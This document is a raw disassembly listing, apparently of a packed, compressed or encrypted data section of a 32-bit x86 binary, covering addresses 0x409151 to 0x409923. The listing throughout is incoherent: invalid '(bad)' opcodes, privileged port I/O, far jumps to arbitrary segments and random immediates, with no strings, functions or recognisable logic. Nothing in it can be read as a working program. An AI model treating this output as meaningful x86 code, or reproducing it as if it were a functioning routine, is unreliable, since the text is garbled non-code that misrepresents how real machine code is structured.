  409151:	jle    0x409137
  409153:	mov    ds:0x587f43a9,eax
  409158:	mov    esi,cs
  40915a:	jmp    0xa95d84e0
  40915f:	sbb    al,0x3a
  409161:	xchg   ebx,eax
  409162:	pop    ecx
  409163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409164:	inc    esp
  409165:	fucom  st(6)
  409167:	(bad)  
  409168:	(bad)  
  409169:	sbb    al,0xf7
  40916b:	jl     0x4091d8
  40916d:	mov    DWORD PTR [ebx-0x21e41d52],edx
  409173:	jg     0x40918d
  409175:	pop    ds
  409176:	pop    edx
  409177:	dec    eax
  409179:	sbb    BYTE PTR [ecx],ah
  40917b:	(bad)  
  40917c:	mov    ecx,?
  40917e:	fwait
  40917f:	push   esp
  409180:	and    al,0xd8
  409182:	inc    ebx
  409183:	js     0x4091f7
  409185:	gs xchg ecx,eax
  409187:	push   es
  409188:	ins    DWORD PTR es:[edi],dx
  409189:	retf   0xf915
  40918c:	cmp    al,0x77
  40918e:	inc    edx
  409190:	sbb    al,0x21
  409192:	adc    al,0x25
  409194:	push   es
  409195:	fadd   QWORD PTR [edi-0x13]
  409198:	push   edx
  409199:	sbb    eax,0xd6319635
  40919e:	inc    BYTE PTR [ecx]
  4091a0:	jns    0x4091ac
  4091a2:	pop    ecx
  4091a3:	icebp  
  4091a4:	(bad)  
  4091a5:	jp     0x409131
  4091a7:	jp     0x409158
  4091a9:	rep lods eax,DWORD PTR ds:[esi]
  4091ab:	push   0xffffffca
  4091ad:	aam    0x4b
  4091af:	repnz out 0x8f,al
  4091b2:	rcr    BYTE PTR [ebp+esi*2+0x33732aa5],cl
  4091b9:	scas   al,BYTE PTR es:[edi]
  4091ba:	push   0x26
  4091bc:	sbb    eax,ebp
  4091be:	inc    esi
  4091bf:	(bad)  
  4091c0:	cmp    DWORD PTR [ecx-0x68d11ce8],ecx
  4091c6:	mov    eax,ds:0xd6396f26
  4091cb:	test   ebx,esp
  4091cd:	jbe    0x409180
  4091cf:	jg     0x4091ed
  4091d1:	call   0x602e331c
  4091d6:	push   es
  4091d7:	push   ebx
  4091d8:	(bad)  
  4091d9:	jp     0x409254
  4091db:	inc    esi
  4091dc:	push   ecx
  4091dd:	xor    eax,0x900ab03b
  4091e2:	xor    bl,cl
  4091e4:	xlat   BYTE PTR ds:[ebx]
  4091e5:	test   DWORD PTR [eax-0x5892b6d3],ecx
  4091eb:	cmp    DWORD PTR [eax+0x27],ebp
  4091ee:	int3   
  4091ef:	adc    esp,edi
  4091f1:	mov    bl,0xa5
  4091f3:	mov    ah,0x8
  4091f5:	dec    esi
  4091f6:	in     al,dx
  4091f7:	and    al,0xd9
  4091f9:	sbb    esi,esp
  4091fb:	or     ch,dh
  4091fd:	pushf  
  4091fe:	add    DWORD PTR [esi-0x5f9d0050],esp
  409204:	int    0x35
  409206:	adc    ecx,esp
  409208:	ins    DWORD PTR es:[edi],dx
  409209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40920a:	mov    ecx,0x927a2987
  40920f:	ror    ebx,cl
  409211:	xchg   ebp,eax
  409212:	or     BYTE PTR [esi-0x4],ah
  409215:	in     eax,0xda
  409217:	adc    DWORD PTR [edx],esi
  409219:	or     BYTE PTR [ebx+0x42495a40],dh
  40921f:	mov    ecx,0x2291dd3e
  409224:	jmp    0x3f41:0xc303e2c6
  40922b:	xchg   edi,eax
  40922c:	fstp   DWORD PTR [esi+eiz*2-0x409914ac]
  409233:	jp     0x409223
  409235:	repnz and DWORD PTR [ecx+0x446da3e6],edx
  40923c:	mov    bh,0x2
  40923e:	loopne 0x40920d
  409240:	dec    edi
  409241:	inc    sp
  409243:	clc    
  409244:	mov    esi,0x30b58ff1
  409249:	xor    edx,DWORD PTR [eax-0x8bb009b]
  40924f:	clc    
  409250:	inc    edi
  409251:	jmp    0xf5dd:0x662ea74c
  409258:	shr    DWORD PTR [edx+0x1f],0x29
  40925c:	test   ecx,eax
  40925e:	retf   
  40925f:	push   cs
  409260:	test   al,0x8d
  409262:	rcl    BYTE PTR [ebx],1
  409264:	out    dx,al
  409265:	add    eax,0x68c4766e
  40926a:	loop   0x40921f
  40926c:	rcr    BYTE PTR [ebx-0x19636528],0x60
  409273:	in     al,dx
  409274:	xchg   ecx,edx
  409276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409277:	shr    DWORD PTR [eax+0x7b95d622],0x8d
  40927e:	cwde   
  40927f:	enter  0x10f4,0x92
  409283:	rol    DWORD PTR gs:[ecx-0x1d642b2a],cl
  40928a:	test   eax,0xf09e9a4e
  40928f:	aas    
  409290:	add    al,BYTE PTR [edx-0x76]
  409293:	mov    WORD PTR [ecx+0x140460fd],fs
  409299:	jl     0x409238
  40929b:	pop    ss
  40929c:	inc    edi
  40929d:	shr    DWORD PTR [edx+ebx*4-0x12],cl
  4092a1:	inc    eax
  4092a2:	dec    eax
  4092a3:	es mov ebp,0xd4e2f6ab
  4092a9:	and    BYTE PTR [ebx-0xf],cl
  4092ac:	and    eax,0x6d714711
  4092b1:	ins    BYTE PTR es:[edi],dx
  4092b2:	mov    ds:0xb41d8c24,eax
  4092b7:	inc    edx
  4092b8:	mov    edx,edi
  4092ba:	pop    ecx
  4092bb:	ins    BYTE PTR es:[edi],dx
  4092bc:	es sub ebp,DWORD PTR ds:[esi+ecx*2+0x42]
  4092c2:	or     BYTE PTR ds:0xe134305f,0x9c
  4092c9:	mov    eax,ds:0xd91e4936
  4092ce:	dec    edi
  4092cf:	push   ds
  4092d0:	mov    esp,0x3d5caced
  4092d5:	enter  0xa85f,0x46
  4092d9:	jns    0x4092bd
  4092db:	xchg   cl,dh
  4092dd:	adc    al,0x5c
  4092df:	iret   
  4092e0:	ins    BYTE PTR es:[edi],dx
  4092e1:	loope  0x409346
  4092e3:	xor    cl,BYTE PTR ds:0x9d6e197f
  4092e9:	les    esp,FWORD PTR ds:0x4ec4de65
  4092ef:	iret   
  4092f0:	aam    0x9a
  4092f2:	clc    
  4092f3:	loopne 0x40932f
  4092f5:	add    al,0x67
  4092f7:	leave  
  4092f8:	push   edi
  4092f9:	lahf   
  4092fa:	mov    ebp,0xfa3fdeef
  4092ff:	outs   dx,BYTE PTR ds:[esi]
  409300:	stc    
  409301:	(bad)  
  409302:	gs ret 0x7eca
  409306:	pushf  
  409307:	ror    dl,1
  409309:	jge    0x4092eb
  40930b:	out    dx,eax
  40930c:	out    0xdc,al
  40930e:	mov    esp,0x183bf6b6
  409313:	(bad)  
  409314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409315:	mov    esp,0x5106d8bf
  40931a:	retf   
  40931b:	nop
  40931c:	out    0xcf,eax
  40931e:	std    
  40931f:	xchg   ebp,eax
  409320:	scas   al,BYTE PTR es:[edi]
  409321:	shl    DWORD PTR [esi+0x50],0xaa
  409325:	cmp    DWORD PTR [esp+eax*1],esi
  409328:	out    0xac,al
  40932a:	lea    ecx,[esi]
  40932c:	outs   dx,DWORD PTR ds:[esi]
  40932d:	ror    BYTE PTR [esi-0x1823fa2d],1
  409333:	out    dx,al
  409334:	inc    ecx
  409335:	xchg   BYTE PTR [ecx+0x1d1ccbab],dh
  40933b:	push   ss
  40933c:	mov    ah,0x95
  40933e:	ins    BYTE PTR es:[edi],dx
  40933f:	push   ebx
  409340:	test   BYTE PTR [edi+esi*2],dl
  409343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409344:	sbb    DWORD PTR [esi+0x79df536],ebp
  40934a:	inc    esi
  40934b:	popf   
  40934c:	push   0x60
  40934e:	push   edi
  40934f:	clc    
  409350:	push   ds
  409351:	jb     0x4093ac
  409353:	dec    eax
  409354:	add    eax,DWORD PTR cs:[eax+0x6a]
  409358:	or     al,0x53
  40935a:	add    cl,bh
  40935c:	sub    BYTE PTR [ebx-0x67],bl
  40935f:	pop    ecx
  409360:	loope  0x40939d
  409362:	stos   DWORD PTR es:[edi],eax
  409363:	and    esp,DWORD PTR [ecx+edx*1]
  409366:	sbb    dh,ch
  409368:	in     al,0xf0
  40936a:	fdivr  DWORD PTR [edx-0x5b]
  40936d:	xchg   BYTE PTR [edx+0x253b1f5e],cl
  409373:	xor    BYTE PTR [ecx],ch
  409375:	sbb    DWORD PTR [ecx+0x4c],ebx
  409378:	mov    ebp,0xafc8f42
  40937d:	aaa    
  40937e:	jge    0x4093d8
  409380:	push   0x22
  409382:	pop    ss
  409383:	and    eax,0x3e639887
  409388:	mov    edx,0x6e6862bd
  40938d:	hlt    
  40938e:	popa   
  40938f:	cmp    BYTE PTR [edi+0x45725e53],bh
  409395:	add    edi,DWORD PTR [eax-0x10a14d3e]
  40939b:	push   0x24
  40939d:	pop    ebp
  40939e:	push   esp
  40939f:	out    dx,eax
  4093a0:	(bad)  
  4093a1:	or     BYTE PTR ds:0xa0f19e89,0x14
  4093a8:	sbb    BYTE PTR [edi],dl
  4093aa:	pop    esp
  4093ab:	inc    edx
  4093ac:	dec    ebx
  4093ad:	loop   0x409366
  4093af:	pop    es
  4093b0:	(bad)  
  4093b2:	dec    eax
  4093b3:	pop    eax
  4093b4:	inc    ebp
  4093b5:	nop
  4093b6:	arpl   WORD PTR [ebp-0xa],sp
  4093b9:	fiadd  WORD PTR [ebp+0x3b6e42e]
  4093bf:	pop    es
  4093c0:	push   esp
  4093c1:	stos   BYTE PTR es:[edi],al
  4093c2:	sbb    al,0x23
  4093c4:	xchg   ebx,eax
  4093c5:	rcl    DWORD PTR [esi+0x1a5b366a],cl
  4093cb:	mov    edi,0xd9edaa22
  4093d0:	int3   
  4093d1:	and    al,0x3b
  4093d3:	cmp    eax,0xf0dcfa4e
  4093d8:	mov    bl,0xe4
  4093da:	sbb    BYTE PTR [edx],bl
  4093dc:	inc    ebx
  4093dd:	dec    edi
  4093de:	sbb    DWORD PTR [eax+0x561b13cd],0x5f
  4093e5:	out    0xcf,al
  4093e7:	sub    dl,BYTE PTR [eax-0x77699745]
  4093ed:	dec    edi
  4093ee:	enter  0xa908,0x2b
  4093f2:	mov    ch,0x10
  4093f4:	xchg   esi,eax
  4093f5:	mov    ds:0x86ec7027,eax
  4093fa:	adc    bl,BYTE PTR [eax-0x61]
  4093fd:	mov    al,0x1b
  4093ff:	sti    
  409400:	mov    ds:0x88395a44,al
  409405:	cmp    BYTE PTR [esi+edi*1],0x8d
  409409:	arpl   WORD PTR [edx+0x14],bp
  40940c:	pop    esi
  40940d:	inc    eax
  40940e:	test   DWORD PTR [ebp*8+0xe516e68],eax
  409415:	lods   al,BYTE PTR ds:[esi]
  409416:	(bad)  
  409417:	ins    BYTE PTR es:[edi],dx
  409418:	mov    ebp,0xb28d993f
  40941d:	icebp  
  40941e:	sub    ah,BYTE PTR [ebp-0x3cb97883]
  409424:	jg     0x409496
  409426:	aam    0xe6
  409428:	jg     0x4093f2
  40942a:	out    dx,al
  40942b:	jl     0x40943e
  40942d:	lods   eax,DWORD PTR ds:[esi]
  40942e:	xlat   BYTE PTR ds:[ebx]
  40942f:	xchg   DWORD PTR [ecx+eiz*1+0x4c526bea],esp
  409436:	add    bx,WORD PTR [edi-0x3bc49a1a]
  40943d:	cs jns 0x409447
  409440:	pushf  
  409441:	adc    cl,0x47
  409444:	(bad)  [eax+0x0]
  409447:	aaa    
  409448:	push   ds
  409449:	cdq    
  40944a:	ret    
  40944b:	adc    al,0xd6
  40944d:	lock add cl,dl
  409450:	arpl   WORD PTR [edx+edi*8+0x629bceee],bx
  409457:	into   
  409458:	cwde   
  409459:	pushf  
  40945a:	dec    ebx
  40945b:	push   ebx
  40945c:	jae    0x409491
  40945e:	js     0x409478
  409460:	nop
  409461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409462:	mov    WORD PTR [ecx-0x2c028f78],fs
  409468:	stos   BYTE PTR es:[edi],al
  409469:	in     al,0xb
  40946b:	test   al,0xf8
  40946d:	and    esi,DWORD PTR [ebp+0x35]
  409470:	test   BYTE PTR [eax+0x7643786],dh
  409476:	add    DWORD PTR [ebp+0x2becdd58],0xffffffed
  40947d:	into   
  40947e:	and    ebx,DWORD PTR [eax]
  409480:	aaa    
  409481:	xchg   edi,eax
  409482:	mov    ah,0xb1
  409484:	jg     0x409459
  409486:	js     0x4094c3
  409488:	mov    al,ds:0xfaadcdf
  40948d:	addr16 cs cld 
  409490:	push   0xe60bb685
  409495:	and    ecx,esp
  409497:	adc    eax,0xe05b0e7d
  40949c:	or     ecx,DWORD PTR [edx-0x7a392362]
  4094a2:	push   edi
  4094a3:	jp     0x4094ef
  4094a5:	push   esp
  4094a6:	and    eax,0x2481e2f8
  4094ab:	lods   al,BYTE PTR ds:[esi]
  4094ac:	pop    eax
  4094ad:	int3   
  4094ae:	adc    BYTE PTR [ebx+0xb],bl
  4094b1:	ror    BYTE PTR [edi+eax*4+0x327571e3],0x6b
  4094b9:	jg     0x409522
  4094bb:	pop    ebx
  4094bc:	push   edx
  4094bd:	mov    ebx,0x3fe341ff
  4094c2:	or     al,0x1e
  4094c4:	push   edx
  4094c5:	test   eax,0x68002041
  4094ca:	xor    al,BYTE PTR [edx-0x78]
  4094cd:	fidivr DWORD PTR [esi]
  4094cf:	dec    ebx
  4094d0:	mov    eax,0x1faca49b
  4094d5:	or     ah,BYTE PTR [ebp+0x6b3c5778]
  4094db:	cmp    ch,BYTE PTR [ebx+eiz*8+0x53952eab]
  4094e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094e3:	mov    esp,es
  4094e5:	add    al,0xc0
  4094e7:	mov    DWORD PTR ds:0x7d980bb7,ebp
  4094ed:	mov    al,ds:0x9cc0f2fb
  4094f2:	xchg   BYTE PTR [ebx],bl
  4094f4:	cmc    
  4094f5:	iret   
  4094f6:	popf   
  4094f7:	mov    eax,0x9b1baffb
  4094fc:	mov    dh,0x14
  4094fe:	jg     0x40948c
  409500:	mov    bl,0xc3
  409502:	xor    DWORD PTR [esi+0x279cd865],esp
  409508:	dec    edi
  409509:	and    eax,0x28216265
  40950e:	sar    DWORD PTR [ecx-0x3],1
  409511:	mov    dl,0x64
  409513:	imul   edi,esp,0x5b32b200
  409519:	loope  0x40950b
  40951b:	mov    ah,0xd8
  40951d:	jnp    0x4094aa
  40951f:	inc    ebp
  409520:	pop    ds
  409521:	sbb    BYTE PTR [edi],bh
  409523:	dec    ecx
  409524:	scas   al,BYTE PTR es:[edi]
  409525:	loop   0x409521
  409527:	add    ch,BYTE PTR [ebx-0xb64830b]
  40952d:	mov    DWORD PTR [esi],ecx
  40952f:	repz and eax,0x94a8a7f4
  409535:	mov    eax,0xe922a465
  40953a:	mov    dh,al
  40953c:	xor    bh,BYTE PTR [esi-0x460968cb]
  409542:	add    BYTE PTR [ebx-0x57],0x52
  409546:	fld    QWORD PTR [eax-0x5b]
  409549:	mov    ah,0xb9
  40954b:	push   edx
  40954c:	out    0x70,al
  40954e:	inc    edi
  40954f:	das    
  409550:	mov    esi,DWORD PTR [edi-0x1a64d6e5]
  409556:	aaa    
  409557:	mov    cl,0xc1
  409559:	add    eax,0xea3acfab
  40955e:	push   edx
  40955f:	shl    edx,1
  409561:	in     eax,0xa4
  409563:	dec    esp
  409564:	neg    esp
  409566:	sub    DWORD PTR [edx*8+0x44007111],0x48463437
  409571:	aaa    
  409572:	repz or DWORD PTR [ebp+0x75],edx
  409576:	pushf  
  409577:	popf   
  409578:	ins    DWORD PTR es:[edi],dx
  409579:	add    ch,BYTE PTR [ebp+eax*2+0x7ad13208]
  409580:	cld    
  409581:	lea    ebx,[ebx-0x2d]
  409584:	sbb    eax,0xdf0c4484
  409589:	add    DWORD PTR [ecx-0x4c],esp
  40958c:	pop    edx
  40958d:	call   0x67c9:0xa36e662b
  409594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409595:	shr    DWORD PTR [edi-0x51972f8e],0x44
  40959c:	xor    eax,0xfaea4cee
  4095a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095a2:	fisubr WORD PTR [esi+0x728d9605]
  4095a8:	repz dec ebx
  4095aa:	leave  
  4095ab:	imul   ecx,DWORD PTR [ecx+0x18e5c112],0xdb88a458
  4095b5:	js     0x409631
  4095b7:	sub    edx,DWORD PTR [ecx+esi*4+0x48]
  4095bb:	lds    edi,FWORD PTR [ebp+0x11]
  4095be:	test   BYTE PTR [edi-0x7f],bl
  4095c1:	mov    eax,0x8f1b322a
  4095c6:	adc    edi,DWORD PTR [esp+edi*8+0x6e]
  4095ca:	mov    al,ds:0xb1e034a1
  4095cf:	sbb    al,cl
  4095d1:	fistp  DWORD PTR [eax]
  4095d3:	shl    DWORD PTR [esi-0x1737aa01],1
  4095d9:	rol    BYTE PTR [ebp-0x6c6c22d5],1
  4095df:	out    dx,al
  4095e0:	ja     0x40958f
  4095e2:	jmp    DWORD PTR [ebx]
  4095e4:	fdivr  DWORD PTR [eax+0x1f]
  4095e7:	mov    ebp,0x2f9d9beb
  4095ec:	dec    ecx
  4095ee:	dec    esp
  4095ef:	fisubr WORD PTR [edx]
  4095f1:	cmp    al,0xc0
  4095f3:	call   FWORD PTR [esi+0x78]
  4095f6:	out    0xdd,al
  4095f8:	es mov bl,0x65
  4095fb:	sahf   
  4095fc:	xor    al,0x7d
  4095fe:	push   ebp
  4095ff:	xchg   ebp,eax
  409600:	nop
  409601:	jmp    FWORD PTR [ebp-0x7b]
  409604:	push   0xb199a4b1
  409609:	popa   
  40960a:	jle    0x409609
  40960c:	xchg   BYTE PTR [edx+ecx*4+0x4e976489],bl
  409613:	into   
  409614:	push   edx
  409615:	or     eax,0xac338ddd
  40961a:	cwde   
  40961b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40961c:	call   0x88f052af
  409621:	fld    DWORD PTR [ebx]
  409623:	xchg   ecx,eax
  409624:	push   ds
  409625:	mov    al,ds:0x3ebc462c
  40962a:	cmp    cl,BYTE PTR [edx+0x4ad7ad32]
  409630:	scas   al,BYTE PTR es:[edi]
  409631:	jnp    0x4095bd
  409633:	popa   
  409634:	add    eax,DWORD PTR [edi+eiz*2+0x2ce44891]
  40963b:	adc    al,0xa4
  40963d:	pop    ebp
  40963e:	loope  0x40961b
  409640:	loopne 0x409665
  409642:	out    dx,al
  409643:	xchg   ebx,eax
  409644:	or     BYTE PTR [ecx-0x184dbbeb],dl
  40964a:	mov    di,WORD PTR [ebp-0x5a]
  40964e:	and    al,0x47
  409650:	fimul  WORD PTR [edi+0xa]
  409653:	push   eax
  409654:	ud1    ebp,DWORD PTR [ebx-0x72]
  409658:	add    ecx,ecx
  40965a:	push   ebp
  40965b:	sub    DWORD PTR [ebp+0x5cb06f1c],0xfffffffc
  409662:	or     DWORD PTR [ebx+0x32],ebx
  409665:	push   ss
  409666:	sahf   
  409667:	outs   dx,BYTE PTR ds:[esi]
  409668:	icebp  
  409669:	pop    es
  40966a:	jbe    0x4096ea
  40966c:	mov    ah,0x2d
  40966e:	bound  esi,QWORD PTR [ecx+0x13]
  409671:	stos   DWORD PTR es:[edi],eax
  409672:	(bad)  
  409674:	int    0xd
  409676:	mov    BYTE PTR [ebp-0x45],dl
  409679:	dec    esi
  40967a:	xchg   ebp,eax
  40967b:	neg    DWORD PTR [edx-0x69]
  40967e:	jmp    0x6e54e01b
  409683:	stos   BYTE PTR es:[edi],al
  409684:	ins    BYTE PTR es:[edi],dx
  409685:	arpl   WORD PTR ds:0xfae6fe29,si
  40968b:	les    esi,FWORD PTR [ebp-0x47]
  40968e:	adc    eax,0x4313ed48
  409693:	fdivr  QWORD PTR ss:[edx]
  409696:	pushf  
  409697:	mov    ds:0xa3c2d847,al
  40969c:	js     0x409714
  40969e:	add    DWORD PTR [ebx],edx
  4096a0:	mov    eax,0x4cf385ed
  4096a5:	into   
  4096a6:	ror    DWORD PTR [ebx],cl
  4096a8:	add    al,0xb9
  4096aa:	scas   eax,DWORD PTR es:[edi]
  4096ab:	pusha  
  4096ac:	pop    es
  4096ad:	out    0x25,eax
  4096af:	add    BYTE PTR [esi+ebp*2],0xab
  4096b3:	push   cs
  4096b4:	dec    esp
  4096b5:	lods   al,BYTE PTR ds:[esi]
  4096b6:	out    0x36,al
  4096b8:	addr16 mov edi,0x8f8c2e5
  4096be:	push   ebp
  4096bf:	mov    DWORD PTR [esi+0x2f6ef0f4],ebx
  4096c5:	push   esi
  4096c6:	push   ebx
  4096c7:	inc    esi
  4096c8:	stc    
  4096c9:	inc    esp
  4096ca:	jnp    0x409687
  4096cc:	cmp    eax,DWORD PTR [edx]
  4096ce:	test   al,0x66
  4096d0:	test   al,0x9e
  4096d2:	cmc    
  4096d3:	xor    ch,ah
  4096d5:	sbb    al,0x28
  4096d7:	sub    al,0x15
  4096d9:	push   eax
  4096da:	inc    esi
  4096db:	xchg   esi,eax
  4096dc:	xor    ah,BYTE PTR [edx]
  4096de:	adc    DWORD PTR [esi-0x1a],esi
  4096e1:	inc    edx
  4096e3:	cwde   
  4096e4:	xchg   ebp,eax
  4096e5:	sub    DWORD PTR ds:0xa9828ae3,ebx
  4096eb:	add    al,BYTE PTR [edx+0x27bd622]
  4096f1:	xchg   edx,eax
  4096f2:	pushf  
  4096f3:	bound  ecx,QWORD PTR [eax]
  4096f5:	sub    edi,DWORD PTR [ebx-0x5]
  4096f8:	push   ecx
  4096f9:	(bad)  
  4096fa:	xchg   esi,eax
  4096fb:	push   esp
  4096fc:	sub    bh,dl
  4096fe:	xchg   ecx,eax
  4096ff:	mov    es,WORD PTR [edi]
  409701:	lods   al,BYTE PTR ds:[esi]
  409702:	pop    edx
  409703:	sbb    ch,BYTE PTR [edx-0x61]
  409706:	push   esp
  409707:	clc    
  409708:	mov    cl,0xd3
  40970a:	sub    DWORD PTR [eax+0x50],esp
  40970d:	loopne 0x409726
  40970f:	mov    dh,0xc0
  409711:	or     eax,0xfe2b3474
  409716:	push   edi
  409717:	test   DWORD PTR [esi+0x18],eax
  40971a:	or     eax,0xf4fe6ca7
  40971f:	add    DWORD PTR [ecx],ebp
  409721:	scas   eax,DWORD PTR es:[edi]
  409722:	mov    esi,0xefdc175c
  409727:	iret   
  409728:	xchg   ebp,eax
  409729:	sub    BYTE PTR ds:0x7097cf64,cl
  40972f:	lods   al,BYTE PTR ds:[esi]
  409730:	dec    edi
  409731:	dec    ecx
  409732:	lods   eax,DWORD PTR ds:[esi]
  409733:	(bad)
  409736:	and    eax,0xfc363046
  40973b:	ja     0x409734
  40973d:	dec    edx
  40973e:	es cmc 
  409740:	sbb    ah,dl
  409742:	xchg   edi,eax
  409743:	arpl   di,sp
  409745:	dec    ebp
  409746:	xor    BYTE PTR [ecx],ah
  409748:	sub    al,0x64
  40974a:	fisub  WORD PTR [eax+0x46]
  40974d:	adc    edi,DWORD PTR [ebx+0x1afe2652]
  409753:	mov    cl,dl
  409755:	std    
  409756:	rcr    ebp,1
  409758:	outs   dx,BYTE PTR ds:[esi]
  409759:	aad    0xdb
  40975b:	jmp    0x409731
  40975d:	pop    eax
  40975e:	mov    BYTE PTR [ebx+edx*8+0xb8b30a9],ch
  409765:	sub    dh,BYTE PTR [edi+0x1892255f]
  40976b:	pop    es
  40976c:	arpl   ax,bp
  40976e:	pushf  
  40976f:	pop    ebx
  409770:	retf   0xef2e
  409773:	sub    eax,0xd2357054
  409778:	(bad)  
  409779:	dec    esi
  40977a:	sub    dh,BYTE PTR [ecx-0x640c1177]
  409780:	xchg   ecx,eax
  409781:	in     eax,0x66
  409783:	mov    eax,0x81a3f459
  409788:	sbb    edx,ebp
  40978a:	xchg   DWORD PTR ds:0x2de83d5f,ebp
  409790:	jnp    0x409785
  409792:	jle    0x409798
  409794:	xchg   ebx,eax
  409795:	mov    edi,0x90cd186d
  40979a:	test   al,0x73
  40979c:	mov    DWORD PTR [eax+0x23d486fb],edi
  4097a2:	(bad)  
  4097a3:	paddw  mm0,QWORD PTR [ebx+0x7ff68938]
  4097aa:	shl    edx,0xeb
  4097ad:	and    dl,ch
  4097af:	xchg   ebx,eax
  4097b0:	sub    DWORD PTR [ecx],ebp
  4097b2:	pop    ecx
  4097b3:	pusha  
  4097b4:	jl     0x4097e0
  4097b6:	mov    al,0x51
  4097b8:	jle    0x4097f8
  4097ba:	dec    esp
  4097bb:	leave  
  4097bc:	and    BYTE PTR [edi-0x76],cl
  4097bf:	stos   DWORD PTR es:[edi],eax
  4097c0:	pop    ss
  4097c1:	scas   al,BYTE PTR es:[edi]
  4097c2:	iret   
  4097c3:	add    al,0x0
  4097c5:	push   esp
  4097c6:	or     eax,0xcacc53cb
  4097cb:	or     bl,BYTE PTR ss:[esi-0x6e]
  4097cf:	outs   dx,BYTE PTR ds:[esi]
  4097d0:	adc    eax,0x691f00b0
  4097d5:	adc    eax,0xb2302a0d
  4097da:	xor    DWORD PTR [ebx-0x52],esi
  4097dd:	push   edx
  4097de:	js     0x409830
  4097e0:	inc    eax
  4097e1:	popa   
  4097e2:	pop    ebp
  4097e3:	(bad)  
  4097e4:	mov    eax,ds:0x97ece1cb
  4097e9:	sub    eax,0x670eef9b
  4097ee:	or     al,0xa3
  4097f0:	push   ss
  4097f1:	dec    ecx
  4097f2:	lock dec edi
  4097f4:	xchg   DWORD PTR cs:[edx+0x2f],ebx
  4097f8:	mov    ds:0x1a10ba52,eax
  4097fd:	cld    
  4097fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097ff:	pop    ebx
  409800:	repnz ds and al,0x65
  409804:	ficom  DWORD PTR [ebp+eiz*2-0x30]
  409808:	dec    ecx
  409809:	push   esp
  40980a:	fidiv  WORD PTR [eax-0x21b2d688]
  409810:	fisub  WORD PTR [ebx+0xf]
  409813:	ror    DWORD PTR [esi],1
  409815:	in     al,0xb9
  409817:	(bad)  
  409818:	retf   
  409819:	pop    ds
  40981a:	dec    ebx
  40981b:	loop   0x40983f
  40981d:	pop    es
  40981e:	rol    eax,1
  409820:	sahf   
  409821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409822:	cmc    
  409823:	mov    bl,0x9f
  409825:	mov    ebp,0xc949c6a5
  40982a:	js     0x409817
  40982c:	sar    ebp,cl
  40982e:	xchg   esp,eax
  40982f:	add    BYTE PTR [eax-0x61],0xda
  409833:	inc    ebp
  409834:	push   cs
  409835:	dec    eax
  409836:	sbb    ebx,ecx
  409838:	or     eax,0x59a40b
  40983d:	or     DWORD PTR [ebx],edx
  40983f:	pop    es
  409840:	jecxz  0x4097da
  409842:	test   eax,0x559a761e
  409847:	adc    edx,esi
  409849:	jb     0x409838
  40984b:	iret   
  40984c:	jae    0x4097de
  40984e:	push   ss
  40984f:	sub    DWORD PTR [edi+eax*1-0x13],0x7d359c9e
  409857:	xor    al,bh
  409859:	call   0x8525:0x69fc6d91
  409860:	int    0x7
  409862:	(bad)  
  409863:	pop    ss
  409864:	sahf   
  409865:	xchg   ebx,eax
  409866:	adc    al,0xca
  409868:	outs   dx,DWORD PTR ds:[esi]
  409869:	pop    ss
  40986a:	xchg   ecx,eax
  40986b:	cs (bad) 
  40986d:	mov    ebx,0xd34a9de0
  409872:	mov    ebx,0x89c268a2
  409877:	push   edx
  409878:	cs dec edx
  40987a:	inc    eax
  40987b:	ficom  DWORD PTR [ebp+0x4b71f2ee]
  409881:	and    eax,0x48b972ce
  409886:	and    eax,0x3c0dafd1
  40988b:	sub    eax,0xa041a925
  409890:	ret    
  409891:	unpckhps xmm0,xmm5
  409894:	idiv   eax
  409896:	int    0x92
  409898:	jne    0x40982b
  40989a:	loope  0x409848
  40989c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40989d:	ds cwde 
  40989f:	gs test bh,0x16
  4098a3:	ins    DWORD PTR es:[edi],dx
  4098a4:	shl    DWORD PTR [eax],1
  4098a6:	add    BYTE PTR [edi+esi*1+0x19],ah
  4098aa:	rcr    DWORD PTR [edi-0x1],0x2
  4098ae:	sahf   
  4098af:	pop    ebp
  4098b0:	pop    ecx
  4098b1:	jnp    0x409872
  4098b3:	mov    al,0x75
  4098b5:	mul    ebp
  4098b7:	pop    ecx
  4098b8:	or     esp,ebp
  4098ba:	push   ebx
  4098bb:	or     al,0x62
  4098bd:	push   ebx
  4098be:	out    0x62,eax
  4098c0:	std    
  4098c1:	jle    0x409864
  4098c3:	fidivr WORD PTR [eax+0x5b]
  4098c6:	ins    BYTE PTR es:[edi],dx
  4098c7:	arpl   sp,dx
  4098c9:	inc    edi
  4098ca:	dec    edx
  4098cb:	fstp   TBYTE PTR [edx]
  4098cd:	jmp    0x4098e3
  4098cf:	jo     0x40987e
  4098d1:	stos   BYTE PTR es:[edi],al
  4098d2:	mov    DWORD PTR [eax+0x39ce3043],eax
  4098d8:	pushf  
  4098d9:	pop    eax
  4098da:	xchg   ebp,eax
  4098db:	leave  
  4098dc:	aam    0x3a
  4098de:	in     eax,dx
  4098df:	fmul   QWORD PTR [ebx-0x4cfff7a0]
  4098e5:	test   al,0x26
  4098e7:	mov    dl,0x86
  4098e9:	je     0x409934
  4098eb:	jecxz  0x409950
  4098ed:	and    al,BYTE PTR [edi-0x3f]
  4098f0:	pop    edx
  4098f1:	lods   al,BYTE PTR ds:[esi]
  4098f2:	test   eax,esi
  4098f4:	test   DWORD PTR [esi-0x76affccf],esi
  4098fa:	fs adc eax,eax
  4098fd:	ret    
  4098fe:	sbb    ebp,DWORD PTR [ebx]
  409900:	fsubr  DWORD PTR ds:0x21a849d
  409906:	and    dl,BYTE PTR [esi-0x61e129de]
  40990c:	xor    BYTE PTR [esi],dl
  40990e:	sub    BYTE PTR [esi+ecx*2+0x65cbf676],0x92
  409916:	mov    ebp,0x7037d4a
  40991b:	mov    al,0x9b
  40991d:	retf   
  40991e:	mov    ds:0x1b2dd8e,al
  409923:	dec    edi
